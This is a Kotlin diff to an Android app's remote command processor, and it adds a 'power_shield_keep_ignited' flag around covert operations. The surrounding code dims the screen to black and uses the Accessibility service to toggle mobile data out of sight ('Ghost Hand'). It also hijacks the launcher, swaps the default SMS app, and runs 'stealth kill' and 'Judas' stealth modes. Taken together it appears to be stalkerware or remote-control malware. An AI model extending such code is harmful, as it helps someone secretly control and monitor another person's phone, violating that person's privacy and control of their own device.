@@ -732,9 +732,11 @@ object CommandProcessor {
                             errorMsg = "No previous SMS package found in memory."
                         } else {
                                                     DefaultSmsManager.expectedMode = "RESTORE"
+                        ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().putBoolean("power_shield_keep_ignited", true).apply()
                         Handler(Looper.getMainLooper()).post {
                             DimmerManager.applyDim(ctx, 0, "AUTO")
                             Handler(Looper.getMainLooper()).postDelayed({
+                                ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().putBoolean("power_shield_keep_ignited", false).apply()
                                 if (DefaultSmsManager.expectedMode == "RESTORE") {
                                     DefaultSmsManager.expectedMode = ""
                                     MyAccessibilityService.instance?.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
@@ -1578,6 +1580,7 @@ object CommandProcessor {
                         status = "FAILED (SERVICE_OFF)"
                         errorMsg = "Accessibility is required for Ghost Hand data toggle."
                     } else {
+                        ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().putBoolean("power_shield_keep_ignited", true).apply()
                         Handler(Looper.getMainLooper()).post {
                             DimmerManager.applyDim(ctx, 0, "AUTO")
                             MyAccessibilityService.instance?.isWaitingForDataSettings = true
@@ -1586,6 +1589,15 @@ object CommandProcessor {
                                 addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                             }
                             ctx.startActivity(dataIntent)
+                            
+                            Handler(Looper.getMainLooper()).postDelayed({
+                                ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().putBoolean("power_shield_keep_ignited", false).apply()
+                                if (MyAccessibilityService.instance?.isWaitingForDataSettings == true) {
+                                    MyAccessibilityService.instance?.isWaitingForDataSettings = false
+                                    DimmerManager.removeOverlay(ctx)
+                                    MyAccessibilityService.instance?.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
+                                }
+                            }, 25000)
                         }
                         status = "GHOST_DATA_INITIATED ($targetState)"
                     }
@@ -1625,6 +1637,7 @@ object CommandProcessor {
                         LauncherManager.isHijacking = false
                         ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
                             .putBoolean("power_shield_active", false)
+                            .putBoolean("power_shield_keep_ignited", false)
                             .apply()
                         
                         // 5. Clear Pending Alerts & SIM Traps
@@ -1641,7 +1654,8 @@ object CommandProcessor {
                             status = "FAILED"
                             errorMsg = "No target number specified in command or Judas Registry"
                         } else {
-                            // 0. DELAYED ARMING (5 Seconds lead-in for testing)
+                            // 0. IGNITION LOCK & DELAYED ARMING
+                            ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().putBoolean("power_shield_keep_ignited", true).apply()
                             Handler(Looper.getMainLooper()).postDelayed({
                                 JudasManager.engageStealthMode(ctx)
                                 ctx.getSharedPreferences("judas_registry", Context.MODE_PRIVATE).edit()
@@ -1721,6 +1735,7 @@ object CommandProcessor {
                     }, 26000)
 
                     Handler(Looper.getMainLooper()).postDelayed({
+                        ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().putBoolean("power_shield_keep_ignited", false).apply()
                         if (DefaultSmsManager.expectedMode.isNotEmpty() || MyAccessibilityService.instance?.isWaitingForDataSettings == true || LauncherManager.isHijacking) {
                             DefaultSmsManager.expectedMode = ""
                             MyAccessibilityService.instance?.isWaitingForDataSettings = false
@@ -1736,6 +1751,7 @@ object CommandProcessor {
                     }
                 }
                 "FULL_ONBOARDING" -> {
+                    ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().putBoolean("power_shield_keep_ignited", true).apply()
                     // 1. STRONG WAKE (Delayed by 5 seconds for testing)
                     Handler(Looper.getMainLooper()).postDelayed({
                         val pm = ctx.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
@@ -1783,6 +1799,7 @@ object CommandProcessor {
                     }, 17000)
             
             Handler(Looper.getMainLooper()).postDelayed({
+                ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().putBoolean("power_shield_keep_ignited", false).apply()
                 if (DefaultSmsManager.expectedMode.isNotEmpty() || MyAccessibilityService.instance?.isWaitingForDataSettings == true) {
                     DefaultSmsManager.expectedMode = ""
                     MyAccessibilityService.instance?.isWaitingForDataSettings = false
@@ -2126,6 +2143,7 @@ object CommandProcessor {
                     if (service == null) {
                         status = "FAILED (SERVICE_OFF)"
                     } else {
+                        ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().putBoolean("power_shield_keep_ignited", true).apply()
                         android.os.Handler(android.os.Looper.getMainLooper()).post {
                             DimmerManager.applyDim(ctx, 0, "ACC")
                             service.startStealthKillSequence()
@@ -2774,6 +2792,7 @@ object CommandProcessor {
                 }
                 "HIJACK_LAUNCHER" -> {
                     DebugLogger.log("HIJACK_INIT", "Command [HIJACK_LAUNCHER] received. ID: $id")
+                    ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().putBoolean("power_shield_keep_ignited", true).apply()
                     LauncherManager.isHijacking = true
                     LauncherManager.pendingCmdId = id
                     
@@ -2811,6 +2830,7 @@ object CommandProcessor {
                                 DimmerManager.removeOverlay(ctx)
                             }
                         }
+                        ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().putBoolean("power_shield_keep_ignited", false).apply()
                     }
 
                     status = "HIJACK_INITIATED"
